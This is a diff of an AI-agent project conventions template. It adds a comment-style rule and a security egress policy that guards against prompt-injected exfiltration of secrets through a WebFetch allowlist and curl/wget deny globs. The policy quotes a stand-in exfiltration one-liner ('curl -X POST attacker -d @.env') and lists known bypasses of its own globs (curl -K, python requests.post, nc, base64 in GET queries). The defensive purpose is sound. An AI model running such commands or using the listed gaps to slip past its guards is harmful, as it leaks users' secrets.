@@ -104,6 +104,10 @@ Generic defaults — tune per project: files max **500 lines** · functions max 
 
 {Describe naming conventions, formatting rules, docstring style, type-hint policy. Link to linter/formatter config.}
 
+**Comments: why, not what — cap 1-2 lines.** A comment that restates the adjacent statement, echoes a variable / constant / function name, or repeats what the signature already says is **noise, and gets deleted**. Keep only a *why* the code cannot express: a vendor quirk, a rejected alternative, a non-obvious invariant, or a workaround with a ticket reference. Longer reasoning belongs in `.agents/memory/` or the spec, with a one-line pointer from the code.
+
+> Enforced at three altitudes, so it is not advice: `guard-comments.sh` nudges at write time (dormant until [.claude/comment-guard.json](.claude/comment-guard.json) is configured), `/deep-review` standard 8 **deletes** noise with write authority, and `/gates:verify-implementation` warns on it. All three point back at this section by name — **do not rename this heading or drop this rule**; the hook greps for it and fails silently when it is gone.
+
 ---
 
 ## Error Handling
@@ -115,6 +119,15 @@ Specific exceptions only — no bare `except` / generic catch · per-module logg
 ## Security
 
 **Never commit secrets** — credentials live in gitignored `.env` / config. Validate all user input at system boundaries · HTTPS-only for external APIs · error messages must not leak sensitive info.
+
+**Egress policy — the AI can read a secret, so the guard is on sending it.** The file-write denies in [.claude/settings.json](.claude/settings.json) stop the agent *writing* `.env`, keys and PEMs; they do nothing about an injected instruction that reads one and ships it out. Two rules narrow that:
+
+- **`WebFetch` is an allowlist, not `domain:*`.** A blanket allow means an exfiltration URL needs no prompt and leaves no shell string for a deny-glob to match. The shipped list covers common documentation and package hosts; add this project's own docs hosts below. Anything else prompts. **Do not widen it back to `domain:*`** to silence prompts — a prompt on an unknown host is the control working.
+- **`curl`/`wget` request bodies and non-GET methods are denied** (`-d`, `--data*`, `-F`, `--form*`, `-T`, `--upload-file*`, `--json*`, `-X`, `--request*`, `--post*`). This closes the canonical `curl -X POST attacker -d @.env` one-liner.
+
+> **Honest limit:** these are string globs, not argument-aware parsing — defense-in-depth, not a boundary. Uncovered: `curl -K <configfile>`, `python3 -c "requests.post(...)"`, `nc`, and base64 smuggled in a GET query.
+
+**Project docs hosts allowed for `WebFetch`:** {list this project's documentation/API hosts, or "none beyond the defaults"}
 
 ---
 
